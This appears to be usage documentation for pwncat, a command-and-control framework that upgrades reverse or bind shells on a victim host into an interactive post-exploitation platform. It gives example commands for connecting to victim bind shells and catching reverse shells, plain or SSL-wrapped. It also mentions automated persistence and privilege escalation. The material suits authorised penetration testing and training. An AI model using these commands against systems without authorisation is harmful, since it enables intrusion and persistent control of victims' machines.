pwncat is a [command and control]() framework which turns a basic [reverse shell]() or [bind shell]() into a fully-featured exploitation platform. After initial connection, the framework will probe the remote system to identify useful binaries natively available on the target system. It will then attempt to start a pseudoterminal on the remote host and provide you with raw terminal access.

On top of raw terminal access, pwncat can programmatically interact with the remote host alongside your terminal access. pwncat provides you with a local shell interface which can utilize your connection for enumeration, file upload/download, automatic persistence installation and even automated privilege escalation.

There are two main operating modes while interacting with a victim in pwncat: remote and local. At any given time, the prompt will include either `(local)` or `(remote)` to indicate the current mode. When using local mode, you have access to pwncat-specific commands such as upload, download, use, run and exit. In remote mode, you will have access to a platform-specific shell environment (e.g. bash or powershell).

To toggle between these modes, you can use the `C-d` key combination. This combination is intercepted by pwncat before being sent to the target when in remote mode. If you need to send a `C-d` combination directly to the target, you can use the `C-k` prefix. Prefixing `C-d` or `C-k` with `C-k` will tell pwncat to send the literaly `C-d` or `C-k` sequence to the target.

Some examples of its usage:

```bash
# netcat syntax
pwncat-cs 192.168.1.1 4444
# Full connection string
pwncat-cs connect://192.168.1.1:4444
# Connection string with assumed protocol
pwncat-cs 192.168.1.1:4444
```

!!! info
    In this case, the victim is running a raw bind shell on an open port. The victim must be available at an address which is routable.

You can also connect to a victim encrypted bind shell:

```bash
# Full connection string
pwncat-cs connect://192.168.1.1:4444
# ncat style syntax
pwncat-cs --ssl 192.168.1.1 4444
pwncat-cs --ssl 192.168.1.1:4444
```

!!! info
    In this case, the victim is running a ssl-wrapped bind shell on an open port. The victim must be available at an address which is routable (e.g. not NAT’d). The `ssl-connect` protocol provides this capability.

Or you can catch a victim rev shell:

```bash
# netcat syntax
pwncat-cs -lp 4444
# Full connection string
pwncat-cs bind://0.0.0.0:4444
# Assumed protocol
pwncat-cs 0.0.0.0:4444
# Assumed protocol, assumed bind address
pwncat-cs :4444
```

!!! info
    In this case, the victim was exploited in such a way that they open a connection to your attacking host on a specific port with a raw shell open on the other end. Your attacking host must be routable from the victim machine. This mode is accessed via the `bind` protocol.

Or even catch a victim encrypted rev shell:

```bash
# ncat style syntax
pwncat-cs --ssl --ssl-cert cert.pem --ssl-key cert.pem -lp 4444
# Full connection string
pwncat-cs ssl-bind://0.0.0.0:4444?certfile=/path/to/cert.pem&keyfile=/path/to/key.pem
# Auto-generated self-signed certificate
pwncat-cs --ssl -lp 4444
# Auto-generated self-signed certificate with explicit protocol
pwncat-cs ssl-bind://0.0.0.0:4444
```

!!! info
    In this case, the victim was exploited in such a way that they open an ssl connection to your attacking host on a specific port with a raw shell open on the other end. Your attacking host must be routable from the victim machine. This mode is accessed via the `ssl-bind` protocol.


